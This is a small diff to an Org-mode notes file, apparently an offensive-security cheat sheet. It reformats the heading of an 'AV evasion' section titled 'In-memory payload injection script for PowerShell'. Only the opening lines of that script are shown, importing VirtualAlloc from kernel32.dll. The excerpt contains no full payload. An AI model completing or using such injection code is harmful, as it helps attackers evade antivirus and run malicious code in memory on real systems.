@@ -1548,7 +1548,8 @@ klist
     #+end_example
 
 * AV evasion
-    #+begin_example In-memory payload injection script for PowerShell
+    In-memory payload injection script for PowerShell
+    #+begin_example 
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, unit, dwSize, uint fAllocationType, uint flProtect);
